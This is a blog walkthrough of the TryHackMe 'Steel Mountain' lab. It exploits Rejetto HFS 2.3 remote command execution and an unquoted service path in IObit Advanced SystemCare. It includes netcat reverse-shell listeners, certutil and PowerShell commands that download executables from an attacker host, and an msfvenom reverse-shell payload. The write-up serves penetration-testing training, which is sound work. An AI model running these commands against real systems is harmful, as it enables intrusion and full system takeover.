---
layout: post
title: "Steel Mountain"
---

[Steel Mountain](https://tryhackme.com/room/steelmountain) is the first machine in the "Advanced Exploitation" part of  TryHackMe's "Offensive pentesting" path.

---

## Enumeration
By scanning the machine with nmap we can see that both port `80` and port `8080` are running the HTTP services.  
Port `80` has nothing relevant. Port `8080`, however, mentioned that this service is running on `HttpFileServer 2.3`.  
By going a quick Google search we can learn that the full name of the service is `Rejetto HTTP File Server (HFS)`.

Let's check for the available exploits:
```
searchsploit Http File Server 2.3
----------------------------------------------------------------------------------------- -------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- -------------------------
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                           | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                      | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                      | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                 | windows/webapps/34852.txt
----------------------------------------------------------------------------------------- -------------------------
```
The official guide is going through the exploitation with `Metasploit`, but I will skip this part, as from learning point of view it's not so useful.

## Exploitation
Let's try out the exploit:
```
searchsploit -m 39161
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /THM/StillMountain/39161.py
```

> Always read the code of exploit before run it!

Line `35` and `36` should be changed to make this exploit to work.

```
ip_addr = "10.11.19.53" #local IP address
local_port = "443" # Local Port number
```
Also, the HTTP server with `nc.exe` should be served on the local host. `nc.exe` can be found in `/usr/share/windows-resources/binaries/nc.exe`.  

```
sudo python -m SimpleHTTPServer 80
```

Create a listener for a reverse shell:

```
sudo nc -nlvp 443
```

Run the exploit and catch the shell:

```
python 39161.py 10.10.114.253  8080
```

## PrivEsc

To enumerate all possible ways to escalate privileges we will use [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS).
Download it and put to the folder where you are already running the `SimpleHTTPServer`.

You can download files to it by using `certutil.exe`.
You can read more about `certutil` [here](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil), but syntax that we will need is:

```
certutil.exe -urlcache -split -f http://10.11.19.53/winPEAS.exe
```

The `PowerShell` also could be an alternative for that:

```
powershell -c (new-object System.Net.WebClient).DownloadFile(‘http://10.11.19.5/winPEAS.exe','C:\Users\Public\winPEAS.exe')
```

Run `winPEAS` and explore the output.

```
AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
```

By checking the available exploits we can find that this service is vulnerable to the `UnquotedServicePath` vulnerability.

To preview the content of the exploit you can use `-x` flag of the `searchsploit`:
```
searchsploit -x 40577
```

The main idea here is that the binary of the service is located in the `C:\Program Files\IObit\Advanced SystemCare\` folder. As the path is unquoted, an attacker could place the malicious binary named `Advanced.exe` to the `C:\Program Files\IObit\` folder.
By starting the service one more time, the `C:\Program Files\IObit\Advanced.exe` will be executed with system rights, instead of the `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`.

Creating a reverse shell:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.19.53 LPORT=53 -f exe -o Advanced.exe
```

Open another listener for the port `53`

```
sudo nc -nlvp 53
```
Download the reverse shell to the machine:

```
cd C:\Program Files\IObit\
certutil.exe -urlcache -split -f http://10.11.19.53/Advanced.exe
```

Stop and start over the service:

```
C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0



C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9
```

## Takeaway
- Make sure that you are enumerating all ports
- If there is a Metasploit module, that means you can do the same thing manually
- Always read the code of the exploit
